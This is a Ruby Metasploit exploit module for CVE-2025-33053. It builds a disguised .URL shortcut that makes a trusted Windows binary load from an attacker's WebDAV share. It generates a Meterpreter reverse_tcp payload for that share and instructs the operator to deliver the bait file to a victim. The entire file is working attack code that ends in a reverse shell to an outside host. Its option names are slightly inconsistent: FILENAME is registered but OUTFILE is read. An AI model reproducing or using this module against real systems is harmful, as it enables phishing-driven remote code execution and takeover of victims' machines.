##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Remote
  include Msf::Exploit::Remote::HttpServer
  Rank = NormalRanking

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'CVE-2025-33053 Exploit via Malicious .URL File and WebDAV',
        'Description' => %q{
          This module exploits CVE-2025-33053 by generating a malicious .URL file pointing
          to a trusted LOLBAS binary with parameters designed to trigger unintended behavior.
          Optionally, a payload is generated and hosted on a specified WebDAV directory.
          When the victim opens the shortcut, it will attempt to access the WebDAV path,
          potentially resulting in remote code execution via a trusted binary.
        },

        'Author' => ['Dev Bui Hieu'],
        'License' => MSF_LICENSE,
        'DisclosureDate' => '2025-06-11',
        'References' => [
          ['CVE', '2025-33053'],
          ['URL', 'https://github.com/DevBuiHieu/CVE-2025-33053-Proof-Of-Concept']
        ],
        'Platform' => 'win',
        'Arch' => ARCH_X64,
        'Targets' => [
          [
            'Windows (generic)',
            {
              'Platform' => 'win',
              'Arch' => ARCH_X64,
              'DefaultOptions' => {
                'PAYLOAD' => 'windows/x64/meterpreter/reverse_tcp'
              }
            }
          ]
        ],
        'DefaultTarget' => 0,
        'Notes' => {
          'Stability' => [CRASH_SAFE],
          'SideEffects' => [ARTIFACTS_ON_DISK],
          'Reliability' => [REPEATABLE_SESSION]
        }
      )
    )

    register_options(
      [
        OptString.new('FILENAME', [true, 'Output URL file name', 'bait.url']),
        OptString.new('PAYLOAD_NAME', [true, 'Output payload file name', 'route.exe']),
        OptBool.new('GEN_PAYLOAD', [true, 'Generate payload and move to WebDAV directory', true]),
        OptString.new('WEBDAV_DIR', [true, 'WebDAV directory path', '/var/www/webdav'])
      ]
    )
    register_advanced_options(
      [
        OptString.new('LOLBAS_EXE',
                      [true, 'Path to trusted binary (LOLBAS)', 'C:\\Program Files\\Internet Explorer\\iediagcmd.exe']),
        OptString.new('ICON_PATH',
                      [true, 'Icon file path', 'C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe']),
        OptInt.new('ICON_INDEX', [true, 'Icon index in icon file', 13]),
        OptString.new('MODIFIED_HEX', [true, 'Modified timestamp in hex', '20F06BA06D07BD014D'])
      ]
    )
  end

  def exploit
    generate_payload_if_needed
    write_url_file
    print_status("Module complete. Deliver #{File.expand_path(datastore['OUTFILE'])} to victim.")
  end

  def generate_payload_if_needed
    return unless datastore['GEN_PAYLOAD']

    exe_path = File.join(datastore['WEBDAV_DIR'], datastore['PAYLOAD_NAME'])
    print_status('Generating payload...')
    generate_payload_exe(datastore['PAYLOAD'], datastore['LHOST'], datastore['LPORT'], exe_path)
  end

  def generate_payload_exe(payload_name, lhost, lport, output_path)
    write_exe_file(output_path, payload.encoded)
  end


  def write_url_file
    content = generate_url_content
    outfile = datastore['OUTFILE']
    begin
      print_status('Generating .URL file...')
      File.write(outfile, content)
      print_good(".URL file written to: #{outfile}")
    rescue Errno::EACCES
      return_error(File.expand_path(outfile))
    end
  end

  def generate_url_content
    unc_path = "\\\\#{datastore['LHOST']}\\#{File.basename(datastore['WEBDAV_DIR'])}\\"
    <<~URLFILE
      [InternetShortcut]
      URL=#{datastore['LOLBAS_EXE']}
      WorkingDirectory=#{unc_path}
      ShowCommand=7
      IconIndex=#{datastore['ICON_INDEX']}
      IconFile=#{datastore['ICON_PATH']}
      Modified=#{datastore['MODIFIED_HEX']}
    URLFILE
  end

  def return_error(currentpath)
    fail_with(Failure::NoAccess,
              "Cannot write to #{currentpath}. Permission denied.\n" \
              'Try restarting Metasploit with root privilege.')
  end
end
